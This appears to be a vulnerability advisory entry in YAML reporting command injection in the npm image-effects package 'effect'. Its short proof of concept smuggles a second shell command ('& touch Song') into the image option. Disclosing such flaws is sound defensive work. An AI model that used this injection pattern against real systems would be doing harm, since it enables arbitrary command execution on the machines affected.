---
- id: snykio:npm:effect:564256
  title: Command Injection
  description: |
    [effect][1] is a node package that allows you to add effects on images.

    Affected versions of this package are vulnerable to Command Injection.
    The argument `options` can be controlled by users without any
    sanitization.

    \##PoC

        var Root= require("effect");
        var options  = {
        image: "& touch Song"
        }
        Root.edge(options, function(){});



    [1]: https://www.npmjs.com/package/effect
  affected_package: effect
